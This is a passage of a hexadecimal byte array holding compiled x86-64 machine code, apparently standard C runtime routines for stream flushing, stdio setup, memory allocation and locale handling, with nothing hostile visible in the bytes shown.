0x0, 0x48, 0x63, 0x5, 0x8e, 0x12, 0x1, 0x0, 0x4c, 0x8d, 0x34, 0xc3, 0x48, 0x89, 0x5c, 0x24, 0x38, 0x49, 0x3b, 0xde, 0xf, 0x84, 0x88, 0x0, 0x0, 0x0, 0x48, 0x8b, 0x3, 0x48, 0x89, 0x44, 0x24, 0x20, 0x48, 0x8b, 0x16, 0x48, 0x85, 0xc0, 0x74, 0x21, 0x8b, 0x48, 0x14, 0x8b, 0xc1, 0xc1, 0xe8, 0xd, 0x24, 0x1, 0x74, 0x15, 0x8b, 0xc1, 0x24, 0x3, 0x3c, 0x2, 0x75, 0x5, 0xf6, 0xc1, 0xc0, 0x75, 0xe, 0xf, 0xba, 0xe1, 0xb, 0x72, 0x8, 0xff, 0x2, 0x48, 0x83, 0xc3, 0x8, 0xeb, 0xbb, 0x48, 0x8b, 0x56, 0x10, 0x48, 0x8b, 0x4e, 0x8, 0x48, 0x8b, 0x6, 0x4c, 0x8d, 0x44, 0x24, 0x20, 0x4c, 0x89, 0x44, 0x24, 0x40, 0x48, 0x89, 0x44, 0x24, 0x48, 0x48, 0x89, 0x4c, 0x24, 0x50, 0x48, 0x89, 0x54, 0x24, 0x58, 0x48, 0x8b, 0x44, 0x24, 0x20, 0x48, 0x89, 0x44, 0x24, 0x28, 0x48, 0x89, 0x44, 0x24, 0x30, 0x4c, 0x8d, 0x4c, 0x24, 0x28, 0x4c, 0x8d, 0x44, 0x24, 0x40, 0x48, 0x8d, 0x54, 0x24, 0x30, 0x48, 0x8d, 0x8c, 0x24, 0x88, 0x0, 0x0, 0x0, 0xe8, 0x9e, 0xfe, 0xff, 0xff, 0xeb, 0xa9, 0x8b, 0xf, 0xe8, 0xe9, 0xd0, 0xff, 0xff, 0x48, 0x8b, 0x9c, 0x24, 0x80, 0x0, 0x0, 0x0, 0x48, 0x83, 0xc4, 0x60, 0x41, 0x5e, 0x5f, 0x5e, 0xc3, 0x88, 0x4c, 0x24, 0x8, 0x55, 0x48, 0x8b, 0xec, 0x48, 0x83, 0xec, 0x40, 0x83, 0x65, 0x28, 0x0, 0x48, 0x8d, 0x45, 0x28, 0x83, 0x65, 0x20, 0x0, 0x4c, 0x8d, 0x4d, 0xe0, 0x48, 0x89, 0x45, 0xe8, 0x4c, 0x8d, 0x45, 0xe8, 0x48, 0x8d, 0x45, 0x10, 0x48, 0x89, 0x45, 0xf0, 0x48, 0x8d, 0x55, 0xe4, 0x48, 0x8d, 0x45, 0x20, 0x48, 0x89, 0x45, 0xf8, 0x48, 0x8d, 0x4d, 0x18, 0xb8, 0x8, 0x0, 0x0, 0x0, 0x89, 0x45, 0xe0, 0x89, 0x45, 0xe4, 0xe8, 0xd4, 0xfe, 0xff, 0xff, 0x80, 0x7d, 0x10, 0x0, 0x8b, 0x45, 0x20, 0xf, 0x45, 0x45, 0x28, 0x48, 0x83, 0xc4, 0x40, 0x5d, 0xc3, 0xcc, 0xcc, 0xcc, 0x48, 0x89, 0x5c, 0x24, 0x8, 0x48, 0x89, 0x6c, 0x24, 0x10, 0x48, 0x89, 0x74, 0x24, 0x18, 0x57, 0x48, 0x83, 0xec, 0x20, 0x48, 0x8b, 0xd9, 0x48, 0x8b, 0xea, 0x8b, 0x49, 0x14, 0x8b, 0xc1, 0x24, 0x3, 0x3c, 0x2, 0x75, 0x4e, 0xf6, 0xc1, 0xc0, 0x74, 0x49, 0x8b, 0x3b, 0x2b, 0x7b, 0x8, 0x83, 0x63, 0x10, 0x0, 0x48, 0x8b, 0x73, 0x8, 0x48, 0x89, 0x33, 0x85, 0xff, 0x7e, 0x35, 0x48, 0x8b, 0xcb, 0xe8, 0x66, 0x5, 0x0, 0x0, 0x4c, 0x8b, 0xcd, 0x44, 0x8b, 0xc7, 0x48, 0x8b, 0xd6, 0x8b, 0xc8, 0xe8, 0x76, 0x27, 0x0, 0x0, 0x3b, 0xf8, 0x74, 0xa, 0xf0, 0x83, 0x4b, 0x14, 0x10, 0x83, 0xc8, 0xff, 0xeb, 0x11, 0x8b, 0x43, 0x14, 0xc1, 0xe8, 0x2, 0xa8, 0x1, 0x74, 0x5, 0xf0, 0x83, 0x63, 0x14, 0xfd, 0x33, 0xc0, 0x48, 0x8b, 0x5c, 0x24, 0x30, 0x48, 0x8b, 0x6c, 0x24, 0x38, 0x48, 0x8b, 0x74, 0x24, 0x40, 0x48, 0x83, 0xc4, 0x20, 0x5f, 0xc3, 0xcc, 0xcc, 0x48, 0x89, 0x5c, 0x24, 0x8, 0x48, 0x89, 0x7c, 0x24, 0x10, 0x55, 0x48, 0x8b, 0xec, 0x48, 0x83, 0xec, 0x60, 0x48, 0x83, 0x65, 0xc0, 0x0, 0x48, 0x8b, 0xd9, 0x83, 0x3d, 0xf7, 0x10, 0x1, 0x0, 0x0, 0xc6, 0x45, 0xd0, 0x0, 0xc6, 0x45, 0xe8, 0x0, 0xc6, 0x45, 0xf0, 0x0, 0xc6, 0x45, 0xf8, 0x0, 0x75, 0x10, 0xf, 0x10, 0x5, 0x6e, 0x1, 0x1, 0x0, 0xc6, 0x45, 0xe8, 0x1, 0xf3, 0xf, 0x7f, 0x45, 0xd8, 0x48, 0x85, 0xdb, 0x75, 0xb, 0x33, 0xc9, 0xe8, 0xc5, 0xfe, 0xff, 0xff, 0x8b, 0xf8, 0xeb, 0x31, 0x48, 0x8d, 0x55, 0xc0, 0xe8, 0x18, 0xff, 0xff, 0xff, 0x85, 0xc0, 0x74, 0x5, 0x83, 0xcf, 0xff, 0xeb, 0x1f, 0x8b, 0x43, 0x14, 0xc1, 0xe8, 0xb, 0xa8, 0x1, 0x74, 0x13, 0x48, 0x8b, 0xcb, 0xe8, 0xa9, 0x4, 0x0, 0x0, 0x8b, 0xc8, 0xe8, 0x12, 0x1e, 0x0, 0x0, 0x85, 0xc0, 0x75, 0xde, 0x33, 0xff, 0x80, 0x7d, 0xe8, 0x2, 0x75, 0xb, 0x48, 0x8b, 0x45, 0xc0, 0x83, 0xa0, 0xa8, 0x3, 0x0, 0x0, 0xfd, 0x80, 0x7d, 0xf0, 0x0, 0x74, 0xf, 0x8b, 0x5d, 0xec, 0x48, 0x8d, 0x4d, 0xc0, 0xe8, 0xd9, 0xc5, 0xff, 0xff, 0x89, 0x58, 0x20, 0x80, 0x7d, 0xf8, 0x0, 0x74, 0xf, 0x8b, 0x5d, 0xf4, 0x48, 0x8d, 0x4d, 0xc0, 0xe8, 0xc4, 0xc5, 0xff, 0xff, 0x89, 0x58, 0x24, 0x48, 0x8b, 0x5c, 0x24, 0x70, 0x8b, 0xc7, 0x48, 0x8b, 0x7c, 0x24, 0x78, 0x48, 0x83, 0xc4, 0x60, 0x5d, 0xc3, 0xcc, 0xcc, 0xcc, 0xb1, 0x1, 0xe9, 0x39, 0xfe, 0xff, 0xff, 0xcc, 0x48, 0x8b, 0xc4, 0x48, 0x89, 0x58, 0x8, 0x48, 0x89, 0x68, 0x10, 0x48, 0x89, 0x70, 0x18, 0x48, 0x89, 0x78, 0x20, 0x41, 0x56, 0x48, 0x83, 0xec, 0x20, 0x8b, 0x5, 0xf5, 0xf, 0x1, 0x0, 0x33, 0xdb, 0xbf, 0x3, 0x0, 0x0, 0x0, 0x85, 0xc0, 0x75, 0x7, 0xb8, 0x0, 0x2, 0x0, 0x0, 0xeb, 0x5, 0x3b, 0xc7, 0xf, 0x4c, 0xc7, 0x48, 0x63, 0xc8, 0xba, 0x8, 0x0, 0x0, 0x0, 0x89, 0x5, 0xd0, 0xf, 0x1, 0x0, 0xe8, 0x3, 0xd4, 0xff, 0xff, 0x33, 0xc9, 0x48, 0x89, 0x5, 0xca, 0xf, 0x1, 0x0, 0xe8, 0x6d, 0xd4, 0xff, 0xff, 0x48, 0x39, 0x1d, 0xbe, 0xf, 0x1, 0x0, 0x75, 0x2f, 0xba, 0x8, 0x0, 0x0, 0x0, 0x89, 0x3d, 0xa9, 0xf, 0x1, 0x0, 0x48, 0x8b, 0xcf, 0xe8, 0xd9, 0xd3, 0xff, 0xff, 0x33, 0xc9, 0x48, 0x89, 0x5, 0xa0, 0xf, 0x1, 0x0, 0xe8, 0x43, 0xd4, 0xff, 0xff, 0x48, 0x39, 0x1d, 0x94, 0xf, 0x1, 0x0, 0x75, 0x5, 0x83, 0xc8, 0xff, 0xeb, 0x75, 0x48, 0x8b, 0xeb, 0x48, 0x8d, 0x35, 0x63, 0x0, 0x1, 0x0, 0x4c, 0x8d, 0x35, 0x44, 0x0, 0x1, 0x0, 0x49, 0x8d, 0x4e, 0x30, 0x45, 0x33, 0xc0, 0xba, 0xa0, 0xf, 0x0, 0x0, 0xe8, 0x7f, 0xf2, 0xff, 0xff, 0x48, 0x8b, 0x5, 0x64, 0xf, 0x1, 0x0, 0x4c, 0x8d, 0x5, 0x15, 0xb, 0x1, 0x0, 0x48, 0x8b, 0xd5, 0x48, 0xc1, 0xfa, 0x6, 0x4c, 0x89, 0x34, 0x3, 0x48, 0x8b, 0xc5, 0x83, 0xe0, 0x3f, 0x48, 0x8d, 0xc, 0xc0, 0x49, 0x8b, 0x4, 0xd0, 0x48, 0x8b, 0x4c, 0xc8, 0x28, 0x48, 0x83, 0xc1, 0x2, 0x48, 0x83, 0xf9, 0x2, 0x77, 0x6, 0xc7, 0x6, 0xfe, 0xff, 0xff, 0xff, 0x48, 0xff, 0xc5, 0x49, 0x83, 0xc6, 0x58, 0x48, 0x83, 0xc3, 0x8, 0x48, 0x83, 0xc6, 0x58, 0x48, 0x83, 0xef, 0x1, 0x75, 0x9e, 0x33, 0xc0, 0x48, 0x8b, 0x5c, 0x24, 0x30, 0x48, 0x8b, 0x6c, 0x24, 0x38, 0x48, 0x8b, 0x74, 0x24, 0x40, 0x48, 0x8b, 0x7c, 0x24, 0x48, 0x48, 0x83, 0xc4, 0x20, 0x41, 0x5e, 0xc3, 0xcc, 0x40, 0x53, 0x48, 0x83, 0xec, 0x20, 0xe8, 0xcd, 0xfe, 0xff, 0xff, 0xe8, 0x6c, 0x29, 0x0, 0x0, 0x33, 0xdb, 0x48, 0x8b, 0xd, 0xe3, 0xe, 0x1, 0x0, 0x48, 0x8b, 0xc, 0xb, 0xe8, 0xe, 0x2a, 0x0, 0x0, 0x48, 0x8b, 0x5, 0xd3, 0xe, 0x1, 0x0, 0x48, 0x8b, 0xc, 0x3, 0x48, 0x83, 0xc1, 0x30, 0xff, 0x15, 0x5d, 0x58, 0x0, 0x0, 0x48, 0x83, 0xc3, 0x8, 0x48, 0x83, 0xfb, 0x18, 0x75, 0xd1, 0x48, 0x8b, 0xd, 0xb4, 0xe, 0x1, 0x0, 0xe8, 0x57, 0xd3, 0xff, 0xff, 0x48, 0x83, 0x25, 0xa7, 0xe, 0x1, 0x0, 0x0, 0x48, 0x83, 0xc4, 0x20, 0x5b, 0xc3, 0xcc, 0x48, 0x83, 0xc1, 0x30, 0x48, 0xff, 0x25, 0x1d, 0x58, 0x0, 0x0, 0xcc, 0x48, 0x83, 0xc1, 0x30, 0x48, 0xff, 0x25, 0x19, 0x58, 0x0, 0x0, 0xcc, 0x40, 0x53, 0x48, 0x83, 0xec, 0x20, 0x48, 0x8b, 0xd9, 0x48, 0x83, 0xf9, 0xe0, 0x77, 0x3c, 0x48, 0x85, 0xc9, 0xb8, 0x1, 0x0, 0x0, 0x0, 0x48, 0xf, 0x44, 0xd8, 0xeb, 0x15, 0xe8, 0x6e, 0x7, 0x0, 0x0, 0x85, 0xc0, 0x74, 0x25, 0x48, 0x8b, 0xcb, 0xe8, 0x12, 0xf7, 0xff, 0xff, 0x85, 0xc0, 0x74, 0x19, 0x48, 0x8b, 0xd, 0xf7, 0x9, 0x1, 0x0, 0x4c, 0x8b, 0xc3, 0x33, 0xd2, 0xff, 0x15, 0x64, 0x58, 0x0, 0x0, 0x48, 0x85, 0xc0, 0x74, 0xd4, 0xeb, 0xd, 0xe8, 0x48, 0xd2, 0xff, 0xff, 0xc7, 0x0, 0xc, 0x0, 0x0, 0x0, 0x33, 0xc0, 0x48, 0x83, 0xc4, 0x20, 0x5b, 0xc3, 0xcc, 0xcc, 0x40, 0x53, 0x48, 0x83, 0xec, 0x20, 0x48, 0x8b, 0x5, 0xb, 0xe, 0x1, 0x0, 0x48, 0x8b, 0xda, 0x48, 0x39, 0x2, 0x74, 0x16, 0x8b, 0x81, 0xa8, 0x3, 0x0, 0x0, 0x85, 0x5, 0xd7, 0xff, 0x0, 0x0, 0x75, 0x8, 0xe8, 0x30, 0x6, 0x0, 0x0, 0x48, 0x89, 0x3, 0x48, 0x83, 0xc4, 0x20, 0x5b, 0xc3, 0xcc, 0xcc, 0xcc, 0x40, 0x53, 0x48, 0x83, 0xec, 0x20, 0x48, 0x8d, 0x5, 0xd7, 0xd, 0x1, 0x0, 0x48, 0x8b, 0xda, 0x4a, 0x8b, 0x4, 0xc0, 0x48, 0x39, 0x2, 0x74, 0x16, 0x8b, 0x81, 0xa8, 0x3, 0x0, 0x0, 0x85, 0x5, 0x9f, 0xff, 0x0, 0x0, 0x75, 0x8, 0xe8, 0xf8, 0x5, 0x0, 0x0, 0x48, 0x89, 0x3, 0x48, 0x83, 0xc4, 0x20, 0x5b, 0xc3, 0xcc, 0xcc, 0xcc, 0x40, 0x53, 0x48, 0x83, 0xec, 0x20, 0x48, 0x8b, 0x5, 0x87, 0x7, 0x1, 0x0, 0x48, 0x8b, 0xda, 0x48, 0x39, 0x2, 0x74, 0x16, 0x8b, 0x81, 0xa8, 0x3, 0x0, 0x0, 0x85, 0x5, 0x6b, 0xff, 0x0, 0x0, 0x75, 0x8, 0xe8, 0xec, 0xe7, 0xff, 0xff, 0x48, 0x89, 0x3, 0x48, 0x83, 0xc4, 0x20, 0x5b, 0xc3, 0xcc, 0xcc, 0xcc, 0x40, 0x53, 0x48, 0x83, 0xec, 0x20, 0x48, 0x8d, 0x5, 0x53, 0x7, 0x1, 0x0, 0x48, 0x8b, 0xda, 0x4a, 0x8b, 0x4, 0xc0, 0x48, 0x39, 0x2, 0x74, 0x16, 0x8b, 0x81, 0xa8, 0x3, 0x0, 0x0, 0x85, 0x5, 0x33, 0xff, 0x0, 0x0, 0x75, 0x8, 0xe8, 0xb4, 0xe7, 0xff, 0xff, 0x48, 0x89, 0x3, 0x48, 0x83, 0xc4, 0x20, 0x5b, 0xc3, 0xcc, 0xcc, 0xcc, 0x48, 0x8b, 0xc4, 0x48, 0x89, 0x58, 0x8, 0x48, 0x89, 0x68, 0x10, 0x48, 0x89, 0x70, 0x18, 0x48, 0x89, 0x78, 0x20, 0x41, 0x56, 0x48, 0x83, 0xec, 0x30, 0x45, 0x33, 0xf6, 0x49, 0x8b, 0xd9, 0x49, 0x8b, 0xe8, 0x48, 0x8b, 0xf2, 0x48, 0x8b, 0xf9, 0x48, 0x85, 0xd2, 0xf, 0x84, 0x23, 0x1, 0x0, 0x0, 0x4d, 0x85, 0xc0, 0xf, 0x84, 0x1a, 0x1, 0x0, 0x0, 0x44, 0x38, 0x32, 0x75, 0x12, 0x48, 0x85, 0xc9, 0xf, 0x84, 0x13, 0x1, 0x0, 0x0, 0x66, 0x44, 0x89, 0x31, 0xe9, 0xa, 0x1, 0x0, 0x0, 0x45, 0x38, 0x71, 0x28, 0x75, 0x8, 0x48, 0x8b, 0xcb, 0xe8, 0xe9, 0xc2, 0xff, 0xff, 0x48, 0x8b, 0x53, 0x18, 0x44, 0x8b, 0x52, 0xc, 0x41, 0x81, 0xfa, 0xe9, 0xfd, 0x0, 0x0, 0x75, 0x27, 0x4c, 0x8d, 0xd, 0xf1, 0xc, 0x1, 0x0, 0x48, 0x89, 0x5c, 0x24, 0x20, 0x4c, 0x8b, 0xc5, 0x48, 0x8b, 0xd6, 0x48, 0x8b, 0xcf, 0xe8, 0x9a, 0x28, 0x0, 0x0, 0x83, 0xc9, 0xff, 0x85, 0xc0, 0xf, 0x48, 0xc1, 0xe9, 0xc6, 0x0, 0x0, 0x0, 0x4c, 0x39, 0xb2, 0x38, 0x1, 0x0, 0x0, 0x75, 0x14, 0x48, 0x85, 0xff, 0xf, 0x84, 0xa4, 0x0, 0x0, 0x0, 0xf, 0xb6, 0x6, 0x66, 0x89, 0x7, 0xe9, 0x99, 0x0, 0x0, 0x0, 0xf, 0xb6, 0xe, 0x48, 0x8b, 0x2, 0x66, 0x44, 0x39, 0x34, 0x48, 0x7d, 0x61, 0x44, 0x8b, 0x4a, 0x8, 0x41, 0x83, 0xf9, 0x1, 0x7e, 0x2b, 0x41, 0x3b, 0xe9, 0x7c, 0x26, 0x41, 0x8b, 0xc6, 0x48, 0x85, 0xff, 0x4c, 0x8b, 0xc6, 0xba, 0x9, 0x0, 0x0, 0x0, 0xf, 0x95, 0xc0, 0x41, 0x8b, 0xca, 0x89, 0x44, 0x24, 0x28, 0x48, 0x89, 0x7c, 0x24, 0x20, 0xe8, 0x42, 0xea, 0xff, 0xff, 0x85, 0xc0, 0x75, 0x13, 0x48, 0x8b, 0x43, 0x18, 0x48, 0x63, 0x48, 0x8, 0x48, 0x3b, 0xe9, 0x72, 0xf, 0x44, 0x38, 0x76, 0x1, 0x74, 0x9, 0x48, 0x8b, 0x43, 0x18, 0x8b, 0x40, 0x8, 0xeb, 0x4b, 0xc6, 0x43, 0x30, 0x1, 0x83, 0xc8, 0xff, 0xc7, 0x43, 0x2c, 0x2a, 0x0, 0x0, 0x0, 0xeb, 0x3b, 0x41, 0x8b, 0xc6, 0x41, 0xb9, 0x1, 0x0, 0x0, 0x0, 0x48, 0x85, 0xff, 0x4c, 0x8b, 0xc6, 0x41, 0x8b, 0xca, 0xf, 0x95, 0xc0, 0x89, 0x44, 0x24, 0x28, 0x41, 0x8d, 0x51, 0x8, 0x48, 0x89, 0x7c, 0x24, 0x20, 0xe8, 0xeb, 0xe9, 0xff, 0xff, 0x85, 0xc0, 0x74, 0xc5, 0xb8, 0x1, 0x0, 0x0, 0x0, 0xeb, 0x9, 0x4c, 0x89, 0x35, 0xd, 0xc, 0x1, 0x0, 0x33, 0xc0, 0x48, 0x8b, 0x5c, 0x24, 0x40, 0x48, 0x8b, 0x6c, 0x24, 0x48, 0x48, 0x8b, 0x74, 0x24, 0x50, 0x48, 0x8b, 0x7c, 0x24, 0x58, 0x48, 0x83, 0xc4, 0x30, 0x41, 0x5e, 0xc3, 0x48, 0x83, 0xec, 0x28, 0x48, 0x85, 0xc9, 0x75, 0x15, 0xe8, 0xda, 0xcf, 0xff, 0xff, 0xc7, 0x0, 0x16, 0x0, 0x0, 0x0, 0xe8, 0x93, 0xce, 0xff, 0xff, 0x83, 0xc8, 0xff, 0xeb, 0x3, 0x8b, 0x41, 0x18, 0x48, 0x83, 0xc4, 0x28, 0xc3, 0xcc, 0xcc, 0x48, 0x89, 0x5c, 0x24, 0x8, 0x48, 0x89, 0x74, 0x24, 0x10, 0x4c, 0x89, 0x4c, 0x24, 0x20, 0x57, 0x48, 0x83, 0xec, 0x30, 0x49, 0x8b, 0xf9, 0x8b, 0xa, 0xe8, 0x32, 0xca, 0xff, 0xff, 0x90, 0x48, 0x8d, 0x1d, 0x7a, 0xb, 0x1, 0x0, 0x48, 0x8d, 0x35, 0xdb, 0xfa, 0x0, 0x0, 0x48, 0x89, 0x5c, 0x24, 0x20, 0x48, 0x8d, 0x5, 0x6f, 0xb, 0x1, 0x0, 0x48, 0x3b, 0xd8, 0x74, 0x19, 0x48, 0x39, 0x33, 0x74, 0xe, 0x48, 0x8b, 0xd6, 0x48, 0x8b, 0xcb, 0xe8, 0x2, 0x4, 0x0, 0x0, 0x48, 0x89, 0x3, 0x48, 0x83, 0xc3, 0x8, 0xeb, 0xd6, 0x8b, 0xf, 0xe8, 0x46, 0xca, 0xff, 0xff, 0x48, 0x8b, 0x5c, 0x24, 0x40, 0x48, 0x8b, 0x74, 0x24, 0x48, 0x48, 0x83, 0xc4, 0x30, 0x5f, 0xc3, 0xcc, 0xcc, 0xb8, 0x1, 0x0, 0x0, 0x0, 0x87, 0x5, 0x55, 0xb, 0x1, 0x0, 0xc3, 0x4c, 0x8b, 0xdc, 0x48, 0x83, 0xec, 0x28, 0xb8, 0x4, 0x0, 0x0, 0x0, 0x4d, 0x8d, 0x4b, 0x10, 0x4d, 0x8d, 0x43, 0x8, 0x89, 0x44, 0x24, 0x38, 0x49, 0x8d, 0x53, 0x18, 0x89, 0x44, 0x24, 0x40, 0x49, 0x8d, 0x4b, 0x8, 0xe8, 0x5b, 0xff, 0xff, 0xff, 0x48, 0x83, 0xc4, 0x28, 0xc3, 0xcc, 0xcc, 0xf0, 0xff, 0x41, 0x10, 0x48, 0x8b, 0x81, 0xe0, 0x0, 0x0, 0x0, 0x48, 0x85, 0xc0, 0x74, 0x3, 0xf0, 0xff, 0x0, 0x48, 0x8b, 0x81, 0xf0, 0x0, 0x0, 0x0, 0x48, 0x85, 0xc0, 0x74, 0x3, 0xf0, 0xff, 0x0, 0x48, 0x8b, 0x81, 0xe8, 0x0, 0x0, 0x0, 0x48, 0x85, 0xc0, 0x74, 0x3, 0xf0, 0xff, 0x0, 0x48, 0x8b, 0x81, 0x0, 0x1, 0x0, 0x0, 0x48, 0x85, 0xc0, 0x74, 0x3, 0xf0, 0xff, 0x0, 0x48, 0x8d, 0x41, 0x38, 0x41, 0xb8, 0x6, 0x0, 0x0, 0x0, 0x48, 0x8d, 0x15, 0x73, 0xfb, 0x0, 0x0, 0x48, 0x39, 0x50, 0xf0, 0x74, 0xb, 0x48, 0x8b, 0x10, 0x48, 0x85, 0xd2, 0x74, 0x3, 0xf0, 0xff, 0x2, 0x48, 0x83, 0x78, 0xe8, 0x0, 0x74, 0xc, 0x48, 0x8b, 0x50, 0xf8, 0x48, 0x85, 0xd2, 0x74, 0x3, 0xf0, 0xff, 0x2, 0x48, 0x83, 0xc0, 0x20, 0x49, 0x83, 0xe8, 0x1, 0x75, 0xcb, 0x48, 0x8b, 0x89, 0x20, 0x1, 0x0, 0x0, 0xe9, 0x79, 0x1, 0x0, 0x0, 0xcc, 0x48, 0x89, 0x5c, 0x24, 0x8, 0x48, 0x89, 0x6c, 0x24, 0x10, 0x48, 0x89, 0x74, 0x24, 0x18, 0x57, 0x48, 0x83, 0xec, 0x20, 0x48, 0x8b, 0x81, 0xf8, 0x0, 0x0, 0x0, 0x48, 0x8b, 0xd9, 0x48, 0x85, 0xc0, 0x74, 0x79, 0x48, 0x8d, 0xd, 0x26, 0xfc, 0x0, 0x0, 0x48, 0x3b, 0xc1, 0x74, 0x6d, 0x48, 0x8b, 0x83, 0xe0, 0x0, 0x0, 0x0, 0x48, 0x85, 0xc0, 0x74, 0x61, 0x83, 0x38, 0x0, 0x75, 0x5c, 0x48, 0x8b, 0x8b, 0xf0, 0x0, 0x0, 0x0, 0x48, 0x85, 0xc9, 0x74, 0x16, 0x83, 0x39, 0x0, 0x75, 0x11, 0xe8, 0xca, 0xce, 0xff, 0xff, 0x48, 0x8b, 0x8b, 0xf8, 0x0, 0x0, 0x0, 0xe8, 0xd2, 0x27, 0x0, 0x0, 0x48, 0x8b, 0x8b, 0xe8, 0x0, 0x0, 0x0, 0x48, 0x85, 0xc9, 0x74, 0x16, 0x83, 0x39, 0x0, 0x75, 0x11, 0xe8, 0xa8, 0xce, 0xff, 0xff, 0x48, 0x8b, 0x8b, 0xf8, 0x0, 0x0, 0x0, 0xe8, 0xbc, 0x28, 0x0, 0x0, 0x48, 0x8b, 0x8b, 0xe0, 0x0, 0x0, 0x0, 0xe8, 0x90, 0xce, 0xff, 0xff, 0x48, 0x8b, 0x8b, 0xf8, 0x0, 0x0, 0x0, 0xe8, 0x84, 0xce, 0xff, 0xff, 0x48, 0x8b, 0x83, 0x0, 0x1, 0x0, 0x0, 0x48, 0x85, 0xc0, 0x74, 0x47, 0x83, 0x38, 0x0, 0x75, 0x42, 0x48, 0x8b, 0x8b, 0x8, 0x1, 0x0, 0x0, 0x48, 0x81, 0xe9, 0xfe, 0x0, 0x0, 0x0, 0xe8, 0x60, 0xce, 0xff, 0xff, 0x48, 0x8b, 0x8b, 0x10, 0x1, 0x0, 0x0, 0xbf, 0x80, 0x0, 0x0, 0x0, 0x48, 0x2b, 0xcf, 0xe8, 0x4c, 0xce, 0xff, 0xff, 0x48, 0x8b, 0x8b, 0x18, 0x1, 0x0, 0x0, 0x48, 0x2b, 0xcf, 0xe8, 0x3d, 0xce, 0xff, 0xff, 0x48, 0x8b, 0x8b, 0x0, 0x1, 0x0, 0x0, 0xe8, 0x31, 0xce, 0xff, 0xff, 0x48, 0x8b, 0x8b, 0x20, 0x1, 0x0, 0x0, 0xe8, 0xa5, 0x0, 0x0, 0x0, 0x48, 0x8d, 0xb3, 0x28, 0x1, 0x0, 0x0, 0xbd, 0x6, 0x0, 0x0, 0x0, 0x48, 0x8d, 0x7b, 0x38, 0x48, 0x8d, 0x5, 0x26, 0xfa, 0x0, 0x0, 0x48, 0x39, 0x47, 0xf0, 0x74, 0x1a, 0x48, 0x8b, 0xf, 0x48, 0x85, 0xc9, 0x74, 0x12, 0x83, 0x39, 0x0, 0x75, 0xd, 0xe8, 0xf6, 0xcd, 0xff, 0xff, 0x48, 0x8b, 0xe, 0xe8, 0xee, 0xcd, 0xff, 0xff, 0x48, 0x83, 0x7f, 0xe8, 0x0, 0x74, 0x13, 0x48, 0x8b, 0x4f, 0xf8, 0x48, 0x85, 0xc9, 0x74, 0xa, 0x83, 0x39, 0x0, 0x75, 0x5, 0xe8, 0xd4, 0xcd, 0xff, 0xff, 0x48, 0x83, 0xc6, 0x8, 0x48, 0x83, 0xc7, 0x20, 0x48, 0x83, 0xed, 0x1, 0x75, 0xb1, 0x48, 0x8b, 0xcb, 0x48, 0x8b, 0x5c, 0x24, 0x30, 0x48, 0x8b, 0x6c, 0x24, 0x38, 0x48, 0x8b, 0x74, 0x24, 0x40, 0x48, 0x83, 0xc4, 0x20, 0x5f, 0xe9, 0xaa, 0xcd, 0xff, 0xff, 0xcc, 0xcc, 0x48, 0x85, 0xc9, 0x74, 0x1c, 0x48, 0x8d, 0x5, 0xec, 0x6e, 0x0, 0x0, 0x48, 0x3b, 0xc8, 0x74, 0x10, 0xb8, 0x1, 0x0, 0x0, 0x0, 0xf0, 0xf, 0xc1, 0x81, 0x5c, 0x1, 0x0, 0x0, 0xff, 0xc0, 0xc3, 0xb8, 0xff, 0xff, 0xff, 0x7f, 0xc3, 0xcc, 0x48, 0x85, 0xc9, 0x74, 0x30, 0x53, 0x48, 0x83, 0xec, 0x20, 0x48, 0x8d, 0x5, 0xbf, 0x6e, 0x0, 0x0, 0x48, 0x8b, 0xd9, 0x48, 0x3b, 0xc8, 0x74, 0x17, 0x8b, 0x81, 0x5c, 0x1, 0x0, 0x0, 0x85, 0xc0, 0x75, 0xd, 0xe8, 0x18, 0x28, 0x0, 0x0, 0x48, 0x8b, 0xcb, 0xe8, 0x50, 0xcd, 0xff, 0xff, 0x48, 0x83, 0xc4, 0x20, 0x5b, 0xc3, 0xcc, 0xcc, 0x48, 0x85, 0xc9, 0x74, 0x1a, 0x48, 0x8d, 0x5, 0x8c, 0x6e, 0x0, 0x0, 0x48, 0x3b, 0xc8, 0x74, 0xe, 0x83, 0xc8, 0xff, 0xf0, 0xf, 0xc1, 0x81, 0x5c, 0x1, 0x0, 0x0, 0xff, 0xc8, 0xc3, 0xb8, 0xff, 0xff, 0xff, 0x7f, 0xc3, 0xcc, 0xcc, 0xcc, 0x48, 0x83, 0xec, 0x28, 0x48, 0x85, 0xc9, 0xf, 0x84, 0x96, 0x0, 0x0, 0x0, 0x41, 0x83, 0xc9, 0xff, 0xf0, 0x44, 0x1, 0x49, 0x10, 0x48, 0x8b, 0x81, 0xe0, 0x0, 0x0, 0x0, 0x48, 0x85, 0xc0, 0x74, 0x4, 0xf0, 0x44, 0x1, 0x8, 0x48, 0x8b, 0x81, 0xf0, 0x0, 0x0, 0x0, 0x48, 0x85, 0xc0, 0x74, 0x4, 0xf0, 0x44, 0x1, 0x8, 0x48, 0x8b, 0x81, 0xe8, 0x0, 0x0, 0x0, 0x48, 0x85, 0xc0, 0x74, 0x4, 0xf0, 0x44, 0x1, 0x8, 0x48, 0x8b, 0x81, 0x0, 0x1, 0x0, 0x0, 0x48, 0x85, 0xc0, 0x74, 0x4, 0xf0, 0x44, 0x1, 0x8, 0x48, 0x8d, 0x41, 0x38, 0x41, 0xb8, 0x6, 0x0, 0x0, 0x0, 0x48, 0x8d, 0x15, 0xd1, 0xf8, 0x0, 0x0, 0x48, 0x39, 0x50, 0xf0, 0x74, 0xc, 0x48, 0x8b, 0x10, 0x48, 0x85, 0xd2, 0x74, 0x4, 0xf0, 0x44, 0x1, 0xa, 0x48, 0x83, 0x78, 0xe8, 0x0, 0x74, 0xd, 0x48, 0x8b, 0x50, 0xf8, 0x48, 0x85, 0xd2, 0x74, 0x4, 0xf0, 0x44, 0x1, 0xa, 0x48, 0x83, 0xc0, 0x20, 0x49, 0x83, 0xe8, 0x1, 0x75, 0xc9, 0x48, 0x8b, 0x89, 0x20, 0x1, 0x0, 0x0, 0xe8, 0x35, 0xff, 0xff, 0xff, 0x48, 0x83, 0xc4, 0x28, 0xc3, 0x48, 0x89, 0x5c, 0x24, 0x8, 0x57, 0x48, 0x83, 0xec, 0x20, 0xe8, 0xb9, 0xc2, 0xff, 0xff, 0x48, 0x8d, 0xb8, 0x90, 0x0, 0x0, 0x0, 0x8b, 0x88, 0xa8, 0x3, 0x0, 0x0, 0x8b, 0x5, 0x7e, 0xf9, 0x0, 0x0, 0x85, 0xc8, 0x74, 0x8, 0x48, 0x8b, 0x1f, 0x48, 0x85, 0xdb, 0x75, 0x2c, 0xb9, 0x4, 0x0, 0x0, 0x0, 0xe8, 0x38, 